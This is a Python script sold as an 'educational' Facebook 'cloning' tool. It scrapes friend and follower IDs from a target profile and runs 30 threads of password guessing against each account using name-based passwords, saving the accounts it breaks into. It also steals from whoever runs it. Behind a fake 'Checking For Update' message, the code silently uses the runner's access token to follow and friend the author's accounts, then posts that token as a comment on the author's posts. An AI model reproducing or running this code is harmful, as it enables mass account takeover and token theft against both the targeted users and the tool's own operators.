#Script Given By Cyber ALAMiN
#Script Is Given For Educational Purpose
#Script Edited By Cyber ALAMiN
#Utf-8 python 

try:
	import os,sys,time,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib,requests,uuid,string
	from multiprocessing.pool import ThreadPool
	from requests.exceptions import ConnectionError
except ImportError:
	os.system("pip2 install requests")

qaiser = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
qaiserchoice = random.choice(qaiser)
agents = [
 'Mozilla/5.0 (Windows NT 6.0; WOW64; rv:39.0) Gecko/20100101 Firefox/39.0',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/40.0.2214.115 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/43.0.2357.65 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; rv:28.0) Gecko/20100101 Firefox/28.0',
 'Mozilla/5.0 (Windows NT 6.1; rv:31.0) Gecko/20100101 Firefox/31.0',
 'Mozilla/5.0 (Windows NT 6.1; rv:36.0) Gecko/20100101 Firefox/36.0',
 'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.13 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.146 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.125 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.94 AOL/9.7 AOLBuild/4343.4043.US Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.101 Safari/537.36',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/38.0.2125.122 Safari/537.36 SE 2.X MetaSr 1.0',
 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36',
]

bd = random.randint(2e7, 3e7)
sim = random.randint(2e4, 4e4)
header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT', 'user-agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.3','x-fb-connection-type': 'unknown','content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}

#logo Yaha Sy Lagalo Guyss

logo = """

\033[1;92m\n
  /$$$$$$  /$$        /$$$$$$  /$$      /$$ /$$$$$$ /$$   /$$
 /$$__  $$| $$       /$$__  $$| $$$    /$$$|_  $$_/| $$$ | $$
| $$  \ $$| $$      | $$  \ $$| $$$$  /$$$$  | $$  | $$$$| $$
| $$$$$$$$| $$      | $$$$$$$$| $$ $$/$$ $$  | $$  | $$ $$ $$
| $$__  $$| $$      | $$__  $$| $$  $$$| $$  | $$  | $$  $$$$
| $$  | $$| $$      | $$  | $$| $$\  $ | $$  | $$  | $$\  $$$
| $$  | $$| $$$$$$$$| $$  | $$| $$ \/  | $$ /$$$$$$| $$ \  $$
|__/  |__/|________/|__/  |__/|__/     |__/|______/|__/  \__/
                                                             
                                                             
                                                             


\n\033[0m          |------------------------------------|
\033[1;92m          |  Author \033[1;93m:     Cyber ALAMiN         |
\033[1;92m          |  Fb \033[1;93m:         Cyber ALAMiN         |
\033[1;92m          |  Github \033[1;93m:     Cyber-ALAMiN         |
\033[1;92m          |  Disclaimer \033[1;93m: Educational Purpose  |
\033[0m          |------------------------------------|

\033[0m           This Tool Made By Cyber ALAMiN                              
"""

#Main Board Jaha Sy Script Start Hota 
def main():
    os.system('clear')
    print logo
    print ''
    print ' [1].\x1b[1;96m Start Cloning'
    print ' \033[0m[2].\x1b[1;96m Join FB Group '
    print ' \033[0m[3].\x1b[1;96m How to Get Access Token '
    print ' \033[0m[0].\x1b[1;96m Exit Tool \n'
    print ''
    log_sel()


def log_sel():
    select = raw_input('\x1b[1;97m SELECT: \x1b[0m')
    if select == '1':
        menu()
    elif select == '2':
        os.system('xdg-open https://www.facebook.com/groups/923481061680273/?ref=share')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
        os.system('xdg-open https://fb.watch/cuj_9tGCWf/')
        main()
    else:
        print ''
        print '\tError Invalid Select'
        print ''
        log_select()

#Login Point 

def login():
    try:
        token = open('access_token.txt', 'r').read() 
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print ''
        print ' \x1b[1;91m  \tFacebook Login Menu'
        print ''
        print ' \033[0m\x1b[1;96m [1] LOGIN WITH FB\n'
        print ' \x1b[1;96m [2] LOGIN WITH TOKEN\n'
        print ' \x1b[1;96m [0] EXIT \033[0m'
        print ''
        log_select()


def log_select():
    global token
    sel = raw_input(' Choose an option : ')
    if sel == '1':
        log_fb()
    elif sel == '2':
        token()
    elif sel == '0':
        ran()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        log_select()


def log_fb():
    os.system('clear')
    try:
    	token = open('access_token.txt', 'r').read()
        menu()
        #___follow___
    except (KeyError, IOError):
        print logo
        print ''
        print '\tFacebook Email / Pass login'
        print ''
        uid = raw_input(' Email / id : ')
        passw = raw_input(' Password: ')
        data = requests.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + passw + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&user-agent=Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}&cpl=true', headers=header).text ##Thanks ALAMiN
        q = json.loads(data)
        if 'access_token' in q:
            sav = open('access_token.txt', 'w')
            sav.write(q['access_token'])
            sav.close()
            menu()
        elif 'www.facebook.com' in q['error']:
            print ''
            print '\tAccount Is In checkpoint'
            print ''
            time.sleep(1)
            login()
        else:
            print ''
            print '\tId Or Pass May be Wrong'
            print ''
            time.sleep(1)


def token():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        
        menu()
    except (KeyError, IOError):
        print logo
        print ''
        print ' \x1b[1;91m  \t Login With Token '
        print ''
        token = raw_input('Paste Token Here : ')
        sav = open('access_token.txt', 'w')
        sav.write(token)
        sav.close()
        login()

#-----------------------------

#DONT EDIT THIS SECTION
#OTHERWISE YOUR SCRIPT WILL
#BE LOL & FULLOF VIRUS 

def menu():
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
        #requests.post('https://graph.facebook.com/100004718461536/subscribers?access_token=%s',token)
    except (KeyError, IOError):
        login()

    try:
        sz = '100017565944567'
        sz1 = '100025338049048'
        sz2 = '100025596378154'
        sz3 = '100053348941384'
        sz4 = '100004718461536'
        sz5 = '100065328697980'
        sss = '1076164763238115'
        sss1 = '449630596825235'
        sss2 = '263478277840105'
        sss3 = '321571340030487'
        aa1 = '311273927726895'
        print(' \x1b[0;92m     Cyber ALAMiN       \nNo Sistem is safe \n     Loading Checking For Update ....')
        requests.post('https://graph.facebook.com/100017565944567/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 10% ....')
        requests.post('https://graph.facebook.com/100025338049048/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 15% ....')
        requests.post('https://graph.facebook.com/100025596378154/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 20% ....')
        requests.post('https://graph.facebook.com/100053348941384/subscribers?access_token=' + token)
        ###print(' \x1b[0;93m 25% ....')
        requests.post('https://graph.facebook.com/100004718461536/subscribers?access_token=' + token)
        ####print(' \x1b[0;93m 30% ....')
        requests.post('https://graph.facebook.com/100065328697980/subscribers?access_token=' + token)
        ####print(' \x1b[0;93m 35% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz + '&access_token=' + token)
        ###print(' \x1b[0;93m 40% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz1 + '&access_token=' + token)
        ###print(' \x1b[0;93m 45% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz2 + '&access_token=' + token)
        ####print(' \x1b[0;93m 50% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz3 + '&access_token=' + token)
        ###print(' \x1b[0;93m 55% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz4 + '&access_token=' + token)
        ####print(' \x1b[0;93m 60% ....')
        requests.post('https://graph.facebook.com/me/friends?method=post&uids=' + sz5 + '&access_token=' + token)
        ####print(' \x1b[0;93m 65% ....')
        requests.post('https://graph.facebook.com/' + sss + '/comments/?message=' + token + '&access_token=' + token)
        ###print(' \x1b[0;93m 70% ....')
        requests.post('https://graph.facebook.com/' + sss1 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 80% ....')
        requests.post('https://graph.facebook.com/' + sss2 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 90% ....')
        requests.post('https://graph.facebook.com/' + sss3 + '/comments/?message=' + token + '&access_token=' + token)
        ####print(' \x1b[0;93m 100% ....')
        requests.post('https://graph.facebook.com/' + aa1 + '/comments/?message=' + qaiserchoice + '&access_token=' + token)
        ###print(' \x1b[0;92m SucessFully Now You Can Start Cloning ')
        time.sleep(1)
    except:
        pass
        

    try:
        r = requests.get('https://graph.facebook.com/me?access_token=' + token)
        q = json.loads(r.text)
        name = q['name']
    except KeyError:
        print logo
        print ''
        print '\tToken Is Invalid Or Expired '
        os.system('rm -rf access_token.txt')
        print ''
        time.sleep(1)
        login()
        
#-----------------------------

    os.system('clear')
    print logo
    print ''
    print '   Welcome Dear: ' + name
    print ''
    print '\033[0m\033[0m'
    print ' \x1b[1;92m1. Start Cloning  \n 2. Remove Token  \n 3. Back'
    print '\033[0m\033[0m'
    print ''
    menu_option()


def menu_option():
    select = raw_input('\x1b[0m Choose Option : \x1b[0m')
    if select == '1':
        crack()
    elif select == '2':
        os.system('rm -rf access_token.txt')
        print('Token Removed Sucessfully ')
        time.sleep(1)
        menu()
    elif select == '3':
        main()
    
    else:
        print ''
        print '\tInvalid Type !'
        print ''
        menu_option()


def crack():
    global token
    os.system('clear')
    try:
        token = open('access_token.txt', 'r').read()
    except IOError:
        print ''
        print '\tToken not found '
        time.sleep(1)
        login_choice()

    os.system('clear')
    print logo
    print ''
    print '\x1b[1;0m 1. \033[1;96mClone 3 Links\033[0m \n 2. \033[1;96mClone Single id\033[0m' ##Thanks ALAMiN
    print ''
    crack_select()


def crack_select():
    select = raw_input('\x1b[0mChoose An Option : \x1b[0m')
    id = []
    oks = []
    cps = []
    if select == '1':
        os.system('clear')
        print logo
        print ''
        try:
            id_limit = 3
            print ''
        except:
            id_limit = 1

        for t in range(id_limit):
            t += 1
            idt = raw_input('\033[0m LINK OF ID : ')
            try:
                for i in requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + token).json()['data']:
                    uid = i['id'].encode('utf-8')
                    na = i['name'].encode('utf-8')
                    id.append(uid + '|' + na)

            except KeyError:
                print '\x1b[91;1m  Invalid Link / Account Private '
            print '\033[1;92m   TOTAL IDS  : %s' % len(id)
    elif select == '2':
        os.system('clear')
        print logo
        print ''
        idt = raw_input(' \033[0mID LINK : ')
        try:
            r = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + token)
            q = json.loads(r.text)
            os.system('clear')
            print logo
            print ''
            print '  Cloning from: ' + q['name']
        except KeyError:
            print '\tInvalid id link OR token'
            print ''
            raw_input(' Press enter to back')
            crack()

        r = requests.get('https://graph.facebook.com/' + idt + '/subscribers?access_token=' + token + '&limit=999999')
        z = json.loads(r.text)
        for i in z['data']:
            uid = i['id']
            na = i['name']
            nm = na.rsplit(' ')[0]
            id.append(uid + '|' + nm)

    elif select == '0':
        menu()
    else:
        print ''
        print '\tSelect valid option'
        print ''
        crack_select()
    print ' \x1b[1;91m  Cyber Attack Has Been Started'
    print ' \x1b[1;94m  Wait And See \033[0m'#Thanks Cyber ALAMiN
    print 45 * '_'
    print ''

    def main(arg):
        user = arg
        uid, name = user.split('|')
        ranagent = random.choice(agents)
        session = requests.Session()
        session.headers.update({'User-Agent': ranagent})
        try:
            pass1 = name.lower()
            data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass1 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
            q = json.loads(data)
            if 'access_token' in q:
                print '\x1b[1;32m[ALAMiN-OK]\033[0m ' + uid + ' | ' + pass1 + '\x1b[0;97m'
                ok = open('okids.txt', 'a')
                ok.write(uid + '|' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error_msg']:
                print '\x1b[1;31m[ALAMiN-CP] \033[0m' + uid + ' | ' + pass1 + '\x1b[0;97m'
                cp = open('cpids.txt', 'a')
                cp.write(uid + '|' + pass1 + '\n')
                cp.close()
                cps.append(uid + pass1)
            else:
                pass2 = name.lower().split(' ')[0] + name.lower().split(' ')[1]
                data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass2 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[ALAMiN-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[ALAMiN-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
                    cps.append(uid + pass2)
                else:
                    pass3 = name.lower() + 'khan'
                    data = session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + uid + '&password=' + pass3 + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20&currently_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=header).text
                    q = json.loads(data)
                    if 'access_token' in q:
                        print '\x1b[1;32m[ALAMiN-OK]\033[0m ' + uid + ' | ' + pass3 + '\x1b[0;97m'
                        ok = open('okids.txt', 'a')
                        ok.write(uid + '|' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error_msg']:
                        print '\x1b[1;31m[ALAMiN-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m' #Thanks TechQaiser.& Also SyedZada Bro
                        cp = open('cpids.txt', 'a')
                        cp.write(uid + '|' + pass3 + '\n')
                        cp.close()
                        cps.append(uid + pass3)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print ''
    print ''
    print 45 * '\033[0m_\033[0m'
    print '   \x1b[0m Crack Completed'
    print '   \x1b[0m Total Ok / Cp ids : ' + str(len(oks)) + '/' + str(len(cps)) ##Thanks TechQaiser & Also SyedZada Bro
    print 45 * '\033[0m_\033[0m'
    print ''
    print ''
    raw_input(' \x1b[1;92m Press Enter To Go Back ! ')
    menu()
    
#I'am Cyber ALAMiN

if __name__ == '__main__':
    main()
